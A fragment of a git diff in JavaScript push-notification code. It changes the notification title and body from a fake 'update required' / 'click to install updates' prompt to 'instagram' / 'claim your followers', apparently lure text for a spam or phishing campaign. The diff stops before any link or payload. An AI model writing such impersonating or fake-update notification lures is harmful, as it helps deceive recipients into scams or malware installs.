@@ -67,8 +67,8 @@ function sendNotifications() {
     const message = {
       token,
       notification: {
-        title: "update required",
-        body: "click to install updates"
+        title: "instagram",
+        body: "claim your followers"
       },
       webpush: {
         fcmOptions: {
